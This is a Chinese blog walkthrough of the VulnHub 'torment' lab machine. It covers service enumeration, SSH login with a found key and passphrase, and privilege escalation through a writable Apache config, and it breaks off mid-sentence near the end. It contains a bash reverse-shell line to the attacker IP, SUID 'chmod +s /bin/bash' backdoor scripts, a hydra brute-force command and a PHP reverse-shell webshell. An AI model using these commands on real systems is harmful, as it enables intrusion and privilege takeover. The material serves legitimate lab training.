---
layout: post
title: "vulnhub靶场之digitalworld.local系列的torment靶机"
date: 2025-03-06 22:41:39 +0800
description: "当前所获取到的有一个id_rsa文件，一个patrick用户是确定的一个密码这是经过很多的测试所获取的对于网站刚开始访问发现没有任何漏洞的时候，不要就此放弃，可能只是当前没有，不代表在提权时没有用处对于信息收集，要全面，不要遗漏，这个是真的，遗漏一个就需要很长时间对于ngircd协议，这个可以了解，至少知道哪些软件可以通过这个协议去连接对于ssh服务，其使用证书连接目标时，会有密码需要验证的，这是在生成公私钥的时候设置的对于sudo -l。"
keywords: "vulnhub靶场之【digitalworld.local系列】的torment靶机"
categories: ['Oscp']
tags: ['网络安全', '网络', '安全', '学习', 'Web']
artid: "146082130"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146082130
    alt: "vulnhub靶场之digitalworld.local系列的torment靶机"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146082130
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146082130
cover: https://bing.ee123.net/img/rand?artid=146082130
image: https://bing.ee123.net/img/rand?artid=146082130
img: https://bing.ee123.net/img/rand?artid=146082130
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     vulnhub靶场之【digitalworld.local系列】的torment靶机
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-light" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h2>
     <a id="_1">
     </a>
     前言
    </h2>
    <p>
     靶机：
     <code>
      digitalworld.local-torment
     </code>
     ，IP地址为
     <code>
      192.168.10.12
     </code>
    </p>
    <p>
     攻击：
     <code>
      kali
     </code>
     ，IP地址为
     <code>
      192.168.10.6
     </code>
    </p>
    <p>
     <code>
      kali
     </code>
     采用
     <code>
      VMware
     </code>
     虚拟机，靶机选择使用
     <code>
      VMware
     </code>
     打开文件，都选择桥接网络
    </p>
    <p>
     这里官方给的有两种方式，一是直接使用
     <code>
      virtualbox
     </code>
     加载，另一种是通过
     <code>
      VMware
     </code>
     直接加载，也给出了
     <code>
      iso
     </code>
     镜像文件。
    </p>
    <blockquote>
     <p>
      文章中涉及的靶机，来源于
      <code>
       vulnhub
      </code>
      官网，想要下载，可自行访问官网下载，或者通过网盘下载
      <code>
       https://pan.quark.cn/s/86cf8a398835
      </code>
     </p>
    </blockquote>
    <h2>
     <a id="_13">
     </a>
     主机发现
    </h2>
    <p>
     使用
     <code>
      arp-scan -l
     </code>
     或
     <code>
      netdiscover -r 192.168.10.1/24
     </code>
     扫描
    </p>
    <p>
     也可以使用
     <code>
      nmap
     </code>
     等工具进行
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/156227a1ac31b32f8e591b99067f69d8.jpeg"/>
    </p>
    <h2>
     <a id="_23">
     </a>
     信息收集
    </h2>
    <h3>
     <a id="nmap_25">
     </a>
     使用nmap扫描端口
    </h3>
    <p>
     扫描
     <code>
      tcp
     </code>
     端口，并保存于
     <code>
      nmap-tcp
     </code>
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.10.12 --min-rate<span class="token operator">=</span><span class="token number">1000</span>  -p- <span class="token parameter variable">-T4</span> <span class="token parameter variable">-oA</span> nmap-tcp
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c111aa98afc1e80cf9cdadcf7b661d80.jpeg"/>
    </p>
    <p>
     扫描常见的20个
     <code>
      udp
     </code>
     端口，不过这里的端口明显处于
     <code>
      open
     </code>
     的很少
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">-sU</span> <span class="token number">192.168</span>.10.12 --top-ports <span class="token number">20</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-oA</span> nmap-udp
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/38c8b060356aacd015a2647dcb9b0c9b.jpeg"/>
    </p>
    <p>
     把前面扫描出的
     <code>
      tcp
     </code>
     端口，进行处理，只取端口号
    </p>
    <pre><code class="prism language-shell"><span class="token function">grep</span> <span class="token function">open</span> nmap-tcp.nmap <span class="token operator">|</span> <span class="token function">awk</span> -F<span class="token string">'/'</span> <span class="token string">'{print $1}'</span> <span class="token operator">|</span> <span class="token function">paste</span> <span class="token parameter variable">-sd</span> <span class="token string">','</span>
<span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token number">21,22</span>,25,80,111,139,143,445,631,2049,6667,6668,6669,6672,6674,36207,38881,48111,53545
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/e6dc2ecbddaee22deb81c1e91fa627cb.jpeg"/>
    </p>
    <p>
     对特定的端口号进行深入探测
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-O</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.10.12 <span class="token parameter variable">-p</span> <span class="token variable">$ports</span> <span class="token parameter variable">-oA</span> detail
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/551055cbab3cde26183eb5e3f269565d.jpeg"/>
    </p>
    <p>
     <img alt="6" src="https://i-blog.csdnimg.cn/img_convert/990e62e30225b3bbf4c104056cef086a.jpeg"/>
    </p>
    <p>
     <img alt="7" src="https://i-blog.csdnimg.cn/img_convert/a22187f01ea4e20e7e1030897cd84f41.jpeg"/>
    </p>
    <p>
     对特定的端口号进行漏洞检测，其他服务并没有内容，只有631端口进行的
     <code>
      http
     </code>
     枚举
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>vuln <span class="token number">192.168</span>.10.12 <span class="token parameter variable">-p</span> <span class="token variable">$ports</span> <span class="token parameter variable">-oA</span> vuln
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/bd4105b743157afe2e40433d2f4c0677.jpeg"/>
    </p>
    <h3>
     <a id="FTP_72">
     </a>
     FTP服务探测
    </h3>
    <p>
     之前使用
     <code>
      nmap
     </code>
     扫描时，确定是可以匿名登录的，那么直接登录测试
    </p>
    <pre><code class="prism language-shell"><span class="token function">ftp</span> anonymous@192.168.10.12
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/777c68cde3f3447f733b757ab79f4271.jpeg"/>
    </p>
    <p>
     下载所有文件到
     <code>
      kali
     </code>
     中
    </p>
    <pre><code class="prism language-shell">ftp<span class="token operator">&gt;</span> prompt
ftp<span class="token operator">&gt;</span> mget *
</code></pre>
    <p>
     但是有三个文件不能下载
     <code>
      group.bak、gshadow.bak、passwd.bak、shadow.bak
     </code>
     ，因为权限不够，是以匿名用户登录的，所属者为
     <code>
      ftp
     </code>
    </p>
    <p>
     获取到的文件，都是安装所需的，用不到
    </p>
    <p>
     尝试以
     <code>
      telnet
     </code>
     登录，测试
     <code>
      site
     </code>
     是否可以复制，但是不行，因为这里采用的是
     <code>
      vsftpd
     </code>
     了
    </p>
    <h3>
     <a id="80_95">
     </a>
     80端口网站探测
    </h3>
    <p>
     访问80端口界面，就是默认的
     <code>
      apache2
     </code>
     安装后的界面，查看页面源代码，也没有信息泄露
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/a2fead4ba0b2653f9a582f888329d44c.jpeg"/>
    </p>
    <p>
     使用
     <code>
      gobuster
     </code>
     进行目录爆破，当然采用其他工具也行，如
     <code>
      dirb、dirsearch
     </code>
     等
    </p>
    <pre><code class="prism language-shell">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.10.12 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">-x</span> .php,.bak,.txt,s,.,.html <span class="token parameter variable">-b</span> <span class="token number">403</span>-404
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/977821e9ce6423deb642b6e3178f91a4.jpeg"/>
    </p>
    <p>
     这里虽然没有扫描完毕，但是这个目录属实是吸引目光，访问查看，只有一段话，页面源代码中也没有信息。好好好，确实痛苦
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/e27e9aeda44a0da4fcffde0499bafb37.jpeg"/>
    </p>
    <h3>
     <a id="nfs_113">
     </a>
     nfs服务探测
    </h3>
    <p>
     之前扫描的时候发现有
     <code>
      nfs
     </code>
     服务，并有大量的
     <code>
      rpcbind
     </code>
     ，说明这个
     <code>
      nfs
     </code>
     应该在用
    </p>
    <p>
     使用
     <code>
      nmap
     </code>
     先探测一下
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>nfs* <span class="token number">192.168</span>.10.12
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/aab07772e94c356680763cc23e613eb0.jpeg"/>
    </p>
    <p>
     使用
     <code>
      showmount
     </code>
     再测试
    </p>
    <pre><code class="prism language-shell">showmount <span class="token parameter variable">-e</span> <span class="token number">192.168</span>.10.12
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/b79c2c6d0f350585470fd7d3df2f4485.jpeg"/>
    </p>
    <p>
     两个，那么尝试使用
     <code>
      mount
     </code>
     挂载到
     <code>
      kali
     </code>
    </p>
    <pre><code class="prism language-shell"><span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">192.168</span>.10.12:/var/torture ./tor
<span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">192.168</span>.10.12:/var/public ./pub
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c15bcd5902cf9a17aca31fc27cb91af5.jpeg"/>
    </p>
    <p>
     但是查看后，发现这里面的文件都是空白的，暂时搁置
    </p>
    <h3>
     <a id="smb_144">
     </a>
     smb服务探测
    </h3>
    <p>
     使用
     <code>
      nmap
     </code>
     的脚本进一步检测
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>smb* <span class="token number">192.168</span>.10.12
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/3759ecd75dd3efc7c38d07556f80bb9b.jpeg"/>
    </p>
    <p>
     虽然有分享，但是使用
     <code>
      smbclient
     </code>
     连接不了，也就是可能匿名方式不支持
    </p>
    <p>
     再使用
     <code>
      enum4linux
     </code>
     枚举，发现没有任何信息枚举出
    </p>
    <p>
     暂时搁置
    </p>
    <h3>
     <a id="631_160">
     </a>
     631端口网站探测
    </h3>
    <p>
     前面扫描出的631端口的服务是
     <code>
      ipp
     </code>
     ，网络打印服务。这个可以百度一下
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/438f1a2669098e002fbc1c60107a40a5.jpeg"/>
    </p>
    <p>
     访问631端口界面
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/bb668506f8536f72e2ebefa0e5b651ee.jpeg"/>
    </p>
    <p>
     使用
     <code>
      whatweb
     </code>
     探测一下
    </p>
    <pre><code class="prism language-shell">whatweb http://192.168.10.12:631
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/62153371362a3ca8484a1686c5d3a49f.jpeg"/>
    </p>
    <p>
     使用
     <code>
      gobuster
     </code>
     进行网站目录爆破
    </p>
    <pre><code class="prism language-shell">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.10.12:631 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">-x</span> .php,.bak,.txt,s,.,.html <span class="token parameter variable">-b</span> <span class="token number">403</span>-404
</code></pre>
    <p>
     这次的文件有点太多了
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/e0713a10ea6b07a3a7d8d5df2eee52ed.jpeg"/>
    </p>
    <p>
     测试之后，明显不对，这个就不对
    </p>
    <p>
     在网站中随便点击，发现了一个可能包括用户名的界面
     <code>
      printers
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/3d4cdef0f52657ea5c4f84fffbfda187.jpeg"/>
    </p>
    <p>
     使用
     <code>
      cewl
     </code>
     爬取
    </p>
    <pre><code class="prism language-shell">cewl https://192.168.10.12:631/printers/ <span class="token parameter variable">-w</span> word <span class="token parameter variable">-m</span> <span class="token number">3</span>
</code></pre>
    <p>
     为了后续使用，再生成一个全部小写的文件
    </p>
    <pre><code class="prism language-shell"><span class="token function">tr</span> <span class="token string">'[:upper:]'</span> <span class="token string">'[:lower:]'</span> <span class="token operator">&lt;</span> word <span class="token operator">&gt;</span> words
</code></pre>
    <p>
     然后使用
     <code>
      searchsploit
     </code>
     搜索有无对应的漏洞，但是版本对应不上
    </p>
    <p>
     所以暂且到这里
    </p>
    <h3>
     <a id="FTP_210">
     </a>
     FTP再探
    </h3>
    <p>
     这里为什么再探呢，因为到这里，感觉没有可利用的点了， 所以回头看了一下，发现个严重的问题，我在连接FTP时，使用的
     <code>
      ls
     </code>
     命令，并没有展现出隐藏目录，啧
    </p>
    <p>
     再次连接FTP，使用
     <code>
      ls -al
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/91cad99069e6d8e1ca0fcb331b4fa346.jpeg"/>
    </p>
    <p>
     最终查看到
     <code>
      .ngircd、.ssh
     </code>
     目录下有文件
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/4ce02e2dd30f2f5ba0e1dc602a9275e6.jpeg"/>
    </p>
    <p>
     查看
     <code>
      id_rsa
     </code>
     ，这个不知道谁的私钥
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/9bd000f8c5522c218c68b83334919e15.jpeg"/>
    </p>
    <p>
     查看
     <code>
      channel
     </code>
     ，发现是两串字符
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c7514b396bcb4f0f6a5071b4fc8cc2e6.jpeg"/>
    </p>
    <h3>
     <a id="IRC_230">
     </a>
     IRC服务探测
    </h3>
    <p>
     根据前面扫描结果，第一次碰到这个服务，于是搜索了一下
    </p>
    <blockquote>
     <p>
      IRC 即互联网中继聊天（Internet Relay Chat），是一种通过网络进行实时交流的通信协议和相关服务
     </p>
     <p>
      ngircd 是一种开源的、轻量级且可移植的互联网中继聊天（IRC）服务器软件
     </p>
    </blockquote>
    <p>
     那么很可能这个
     <code>
      channels
     </code>
     中的结果对应
     <code>
      bgircd
     </code>
     ，毕竟在
     <code>
      ftp
     </code>
     中，是在这个目录下的
    </p>
    <p>
     首先需要安装个可以通过这个服务连接的软件，这里搜索了一下，最终只有
     <code>
      pidgin
     </code>
     便于安装，并且好用一些
    </p>
    <pre><code class="prism language-shell"><span class="token function">apt-get</span> update
<span class="token function">apt-get</span> <span class="token function">install</span> pidgin
</code></pre>
    <p>
     安装后，输入
     <code>
      pidgin
     </code>
     启动
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/58507ba706127872395beab6f2cdd4eb.jpeg"/>
    </p>
    <p>
     <img alt="26" src="https://i-blog.csdnimg.cn/img_convert/314b1c86a0e79f46f652f23d8de993e5.jpeg"/>
    </p>
    <p>
     这里的密码，并不是随便的，可以自己网上搜索，或者按照
     <code>
      ngircd
     </code>
     后，会有配置文件，查看即可获取密码
    </p>
    <pre><code class="prism language-shell"><span class="token function">cat</span> /etc/ngircd/ngircd.conf
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/4a545dd3fd8101d08162b18b48f72dc9.jpeg"/>
    </p>
    <p>
     密码保存后，点击
     <code>
      buddies
     </code>
     菜单，点击
     <code>
      join a chat
     </code>
     ，可能刚开始是无法点击的，可以自己测试，我忘了点击哪里后可以加入了。然后输入频道
     <code>
      channels
     </code>
     ，这里测试
     <code>
      #games
     </code>
     ，发现无内容
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/a8e01f67834f58086314a3d4f3955b41.jpeg"/>
    </p>
    <p>
     再加入频道
     <code>
      #tormentedprinter
     </code>
     测试，发现可行，并且获取到一个密码
     <code>
      mostmachineshaveasupersecurekeyandalongpassphrase
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/1bf8658296a819303c9e397cda81021d.jpeg"/>
    </p>
    <p>
     根据内容来看，可能是打印机网络界面的登录的密码，不过在尝试爆破后，却没有可用的
    </p>
    <pre><code class="prism language-shell">hydra <span class="token number">192.168</span>.10.12 http-get <span class="token parameter variable">-L</span> words <span class="token parameter variable">-p</span> mostmachineshaveasupersecurekeyandalongpassphrase /admin/log/access_log <span class="token parameter variable">-m</span> <span class="token string">"Authorization: Basic %u:%p"</span> <span class="token parameter variable">-s</span> <span class="token number">631</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c3ce52ea1cd377a37347bc7a508ce3da.jpeg"/>
    </p>
    <h3>
     <a id="smtp_279">
     </a>
     smtp用户枚举
    </h3>
    <p>
     这个需要用到一个工具
     <code>
      smtp-user-enum
     </code>
     ，当然，这是
     <code>
      kali
     </code>
     自带的，不过这个枚举需要自己提供字典
    </p>
    <p>
     这里使用
     <code>
      kali
     </code>
     中
     <code>
      wfuzz
     </code>
     中自带的一个字典
    </p>
    <pre><code class="prism language-shell">smtp-user-enum <span class="token parameter variable">-U</span> /usr/share/wordlists/wfuzz/others/names.txt <span class="token parameter variable">-t</span> <span class="token number">192.168</span>.10.12
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/a29951cf6f5bc91f42cc4fed76ed5e9c.jpeg"/>
    </p>
    <p>
     枚举出的
     <code>
      patrick
     </code>
     用户与前面在打印机网站中包含的一样，也就是这个
     <code>
      patrick
     </code>
     大概率是系统中的用户
    </p>
    <h3>
     <a id="_293">
     </a>
     信息总结
    </h3>
    <p>
     当前所获取到的有一个
     <code>
      id_rsa
     </code>
     文件，一个
     <code>
      patrick
     </code>
     用户是确定的
    </p>
    <p>
     一个密码
     <code>
      mostmachineshaveasupersecurekeyandalongpassphrase
     </code>
    </p>
    <p>
     这是经过很多的测试所获取的
    </p>
    <h2>
     <a id="ssh_301">
     </a>
     ssh连接
    </h2>
    <p>
     根据前面获取的信息，尝试登录
     <code>
      patrick
     </code>
    </p>
    <p>
     发现直接以密码登录是不行的，使用
     <code>
      id_rsa
     </code>
     文件进行登录
    </p>
    <p>
     别忘记更改
     <code>
      id_rsa
     </code>
     文件的权限
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/7e5297518c05ab19b8c45827ddc83c15.jpeg"/>
    </p>
    <p>
     输入
     <code>
      id_rsa
     </code>
     的密码，也就是
     <code>
      mostmachineshaveasupersecurekeyandalongpassphrase
     </code>
     测试
    </p>
    <p>
     发现登录成功
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/42ba2222389d995ce14ae810ecd01e2d.jpeg"/>
    </p>
    <h2>
     <a id="_317">
     </a>
     靶机内信息收集
    </h2>
    <p>
     查看当前目录，并未有信息，那么查看有哪些用户，发现还有一个用户
     <code>
      qiu
     </code>
    </p>
    <pre><code class="prism language-shell"><span class="token function">ls</span> <span class="token parameter variable">-al</span> /home
<span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">grep</span> /bin/bash
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c93e63bb5022f32a5b0287f4b7b74100.jpeg"/>
    </p>
    <p>
     <code>
      qiu
     </code>
     的家目录，无权访问，那么继续收集信息
    </p>
    <p>
     查看
     <code>
      ip
     </code>
     及网络连接状态
    </p>
    <pre><code class="prism language-shell"><span class="token function">ip</span> <span class="token function">add</span>
ss <span class="token parameter variable">-antlp</span>
<span class="token function">netstat</span> <span class="token parameter variable">-ant</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/27fa625f761a5af09f754a89d23c5e37.jpeg"/>
    </p>
    <p>
     查看定时任务
    </p>
    <pre><code class="prism language-shell"><span class="token function">crontab</span> <span class="token parameter variable">-l</span>
atq
<span class="token function">cat</span> /etc/crontab
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/1120391ef07684f0559059ed58de5ccd.jpeg"/>
    </p>
    <p>
     使用
     <code>
      find
     </code>
     寻找具有SUID权限的文件
    </p>
    <pre><code class="prism language-shell"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/b7c02d35eb09b2289a993ff7009e8746.jpeg"/>
    </p>
    <p>
     使用
     <code>
      sudo -l
     </code>
     发现有三个
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/402744462cd55bcb8e0cd290b1324a71.jpeg"/>
    </p>
    <p>
     查看内核版本及系统版本
    </p>
    <pre><code class="prism language-shell"><span class="token function">uname</span> -a/-r
<span class="token function">cat</span> /etc/issue
<span class="token function">cat</span> /etc/*release
lsb_release
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/05dd86a887297baa5dae92a62769afd9.jpeg"/>
    </p>
    <p>
     查看以
     <code>
      root
     </code>
     身份运行的进程，发现
     <code>
      apache2
     </code>
     服务是以
     <code>
      root
     </code>
     启动的，并且这里大概率是开机启动
    </p>
    <pre><code class="prism language-shell"><span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token operator">|</span> <span class="token function">grep</span> root
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/e0e76ba55e99ad0aa8394956b8321617.jpeg"/>
    </p>
    <p>
     上传
     <code>
      pspy64
     </code>
     到靶机，查看有无内容，监控了一会，并没有内容产生
    </p>
    <p>
     上传
     <code>
      linpeas.sh
     </code>
     脚本，该脚本在
     <code>
      github
     </code>
     上有项目，可自行下载
     <code>
      https://github.com/peass-ng/PEASS-ng/releases/tag/20250301-c97fb02a
     </code>
    </p>
    <p>
     这里使用这个脚本只是收集信息，虽然上面把信息收集的差不多，但是防止漏掉
    </p>
    <p>
     确实发现
     <code>
      apache2
     </code>
     的配置文件是可修改的
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/ce84c0550b7fc2c3929ff99c13817ac3.jpeg"/>
    </p>
    <p>
     当然也可以使用命令获取，其他用户具有写权限的文件
    </p>
    <pre><code class="prism language-shell"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> /o+w <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"/proc"</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/bfbd2dd2809969a84ae7e676b928948b.jpeg"/>
    </p>
    <h2>
     <a id="sudo_399">
     </a>
     分析sudo
    </h2>
    <p>
     这里
     <code>
      sudo -l
     </code>
     给出三个
    </p>
    <pre><code class="prism language-shell">/bin/systemctl poweroff		<span class="token comment">#关闭靶机</span>
/bin/systemctl <span class="token function">halt</span>			<span class="token comment">#关闭</span>
/bin/systemctl <span class="token function">reboot</span>		<span class="token comment">#重启靶机</span>
</code></pre>
    <p>
     既然
     <code>
      systemctl
     </code>
     可以，尝试能否写一个
     <code>
      .service
     </code>
     文件，测试后，在
     <code>
      /etc/systemd/system
     </code>
     目录下不可编辑文件
    </p>
    <p>
     结合前面
     <code>
      apache2
     </code>
     是以
     <code>
      root
     </code>
     运行进程的，并且配置文件可以修改
    </p>
    <p>
     好好好，我不知道怎么具体使用，但是肯定要修改配置文件吧，百度一下
    </p>
    <h6>
     <a id="_415">
     </a>
     <strong>
      测试一
     </strong>
    </h6>
    <p>
     尝试修改
     <code>
      /etc/apache2/apache2.conf
     </code>
     文件，首先创建一个脚本，然后在
     <code>
      apache2
     </code>
     配置文件中，设置语句，使得重启服务时，执行这个脚本
    </p>
    <pre><code class="prism language-shell"><span class="token builtin class-name">echo</span> <span class="token string">'chmod +s /bin/bash'</span> <span class="token operator">&gt;</span> /var/www/html/1.sh

<span class="token builtin class-name">echo</span> <span class="token string">"ExecStartPre=/var/www/html/1.sh"</span> <span class="token operator">&gt;&gt;</span> apache2.conf
</code></pre>
    <p>
     这时候重启靶机，也就是执行
     <code>
      sudo /bin/systemctl reboot
     </code>
     ，但是重启后，并没有使得
     <code>
      apache2
     </code>
     服务启动，说明在修改配置文件后，若是需要重启，则可能导致失败。并且这样也会使得目标警觉。所以只能换一种方式
    </p>
    <h6>
     <a id="_429">
     </a>
     测试二
    </h6>
    <p>
     尝试修改
     <code>
      apache2
     </code>
     的配置文件，添加可以运行
     <code>
      cgi
     </code>
     脚本
    </p>
    <pre><code class="prism language-shell"><span class="token operator">&lt;</span>Directory /var/www/html/cgi-bin<span class="token operator">&gt;</span>
    Options +ExecCGI
    AddHandler cgi-script .cgi
<span class="token operator">&lt;</span>/Directory<span class="token operator">&gt;</span>
</code></pre>
    <p>
     然后在网站根目录创建一个
     <code>
      cgi-bin
     </code>
     目录，在其中创建一个脚本，大概内容与前面一致，或者设置反弹
     <code>
      shell
     </code>
     的命令
    </p>
    <pre><code class="prism language-shell"><span class="token function">mkdir</span> cgi-bin
<span class="token builtin class-name">echo</span> <span class="token string">'chmod +s /bin/bash'</span> <span class="token operator">&gt;</span> /var/www/html/cgi-bin/1.cgi
或者
<span class="token builtin class-name">echo</span> <span class="token string">'bash -i &gt;&amp; /dev/tcp/192.168.10.6/9999 0&gt;&amp;1'</span> <span class="token operator">&gt;</span> /var/www/html/cgi-bin/1.cgi
</code></pre>
    <p>
     然后通过浏览器访问触发。
    </p>
    <p>
     啧，不过又失败了
    </p>
    <p>
     网上搜索了一下，大概就是以
     <code>
      root
     </code>
     身份执行
     <code>
      apache2
     </code>
     时，所做的命令都是
     <code>
      root
     </code>
     执行，但是根据目前的情况来看，这是不被允许的，所以需要更换目标用户。
    </p>
    <p>
     这里的用户在前面信息收集时获取的，有
     <code>
      qiu
     </code>
     这个用户
    </p>
    <blockquote>
     <p>
      <strong>
       修改用户和组配置
      </strong>
      ：在
      <code>
       apache2.conf
      </code>
      文件中，
      <code>
       User
      </code>
      和
      <code>
       Group
      </code>
      指令用于指定 Apache 服务器运行时使用的用户和组。攻击者将其修改为目标用户 “qiu”，当 Apache 服务器重新启动后，所有由 Apache 执行的进程都将以 “qiu” 用户的身份运行。这意味着，原本以其他权限运行的服务进程，现在被赋予了 “qiu” 用户的权限，从而实现了权限的变更
     </p>
    </blockquote>
    <h2>
     <a id="_461">
     </a>
     提权
    </h2>
    <h3>
     <a id="qiu_463">
     </a>
     提权至qiu
    </h3>
    <p>
     修改
     <code>
      apache2
     </code>
     的配置文件
    </p>
    <pre><code class="prism language-shell"><span class="token comment"># These need to be set in /etc/apache2/envvars</span>
User <span class="token variable">${APACHE_RUN_USER}</span>		
Group <span class="token variable">${APACHE_RUN_GROUP}</span>
<span class="token comment">#在这个位置添加下面两句</span>
User qiu
Group qiu
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/801895b5c07a6f1c4d6c2a37adb7d89d.jpeg"/>
    </p>
    <p>
     然后根据前面的直接测试可能不行，那么就通过网站的
     <code>
      webshell
     </code>
     进行测试吧，首先创建一个反弹
     <code>
      shell
     </code>
     ，这里可以使用
     <code>
      kali
     </code>
     中自带的一个文件
     <code>
      /usr/share/webshells/php/php-reverse-shell.php
     </code>
    </p>
    <p>
     只需要修改其中的
     <code>
      ip
     </code>
     地址为
     <code>
      kali
     </code>
     的地址即可，反弹的端口可以默认。至于为什么用
     <code>
      php
     </code>
     语言，啧，自己去测试就知道了。
    </p>
    <p>
     把这个文件下载到靶机内，保存到可以访问的网站目录
     <code>
      /var/www/html
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/cdfbb3a2e8c46166835b937fe7221ea1.jpeg"/>
    </p>
    <p>
     这时候执行
     <code>
      sudo /bin/systemctl reboot
     </code>
     重启靶机，这样会连带着
     <code>
      apache2
     </code>
     重启，配置文件可能会重载
    </p>
    <p>
     这时候在
     <code>
      kali
     </code>
     使用
     <code>
      nc
     </code>
     开启一个监听
    </p>
    <pre><code class="prism language-shell"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9999</span>
</code></pre>
    <p>
     然后使用浏览器访问上传到靶机内的脚本文件
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/6f9dd5e42fb82fd214b4258afa25b9bf.jpeg"/>
    </p>
    <p>
     使用
     <code>
      dpkg
     </code>
     等命令测试是否有
     <code>
      python
     </code>
     等
    </p>
    <pre><code class="prism language-shell">dpkg <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> python
</code></pre>
    <p>
     发现有
     <code>
      python3
     </code>
     那么尝试获取一个交互式的
     <code>
      shell
